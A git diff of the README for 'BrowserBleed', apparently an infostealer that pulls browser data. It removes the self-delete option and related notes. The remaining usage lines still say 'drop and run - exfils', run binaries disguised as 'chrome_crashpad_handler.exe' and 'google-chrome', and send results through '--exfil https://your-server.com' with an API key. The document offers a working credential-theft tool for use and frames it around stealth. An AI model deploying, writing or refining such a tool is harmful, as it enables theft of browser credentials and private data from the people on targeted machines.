@@ -228,8 +228,7 @@ When built with a report server baked in (see [Building your own binaries](#buil
 ### Windows
 
 ```
-chrome_crashpad_handler.exe             # drop and run - exfils, vanishes
-chrome_crashpad_handler.exe --no-self-delete   # keep the binary for testing
+chrome_crashpad_handler.exe             # drop and run - exfils
 chrome_crashpad_handler.exe --out results.txt  # also write a local file
 chrome_crashpad_handler.exe --browser chrome   # target one browser only
 chrome_crashpad_handler.exe --memory-only      # skip disk extraction
@@ -246,8 +245,7 @@ python BrowserBleed.py --exfil https://your-server.com --exfil-key YOUR_API_KEY
 ### macOS
 
 ```bash
-sudo ./BrowserBleed_mac                        # drop and run - exfils, self-deletes
-sudo ./BrowserBleed_mac --no-self-delete       # keep the binary for testing
+sudo ./BrowserBleed_mac                        # drop and run - exfils
 sudo ./BrowserBleed_mac --out /tmp/results.txt # also write a local file
 sudo ./BrowserBleed_mac --browser chrome       # target one browser only
 sudo ./BrowserBleed_mac --memory-only          # skip disk extraction
@@ -264,7 +262,7 @@ sudo python3 BrowserBleed_mac.py --exfil https://your-server.com --exfil-key YOU
 ### Linux
 
 ```bash
-sudo ./google-chrome                           # drop and run - exfils (no self-delete)
+sudo ./google-chrome                           # drop and run - exfils
 sudo ./google-chrome --out /tmp/results.txt    # also write a local file
 sudo ./google-chrome --browser chrome          # target one browser only
 sudo ./google-chrome --memory-only             # skip disk extraction
@@ -505,11 +503,6 @@ sudo ./google-chrome          # Linux - exfils, stays on disk
 ```
 
 View results at your report server after logging in with the API key.
-
-**Testing locally:** Windows and macOS — use `--no-self-delete` to keep the binary so you can run it more than once:
-```powershell
-.\chrome_crashpad_handler.exe --no-self-delete
-```
 
 ### Rebuilding after source changes
 
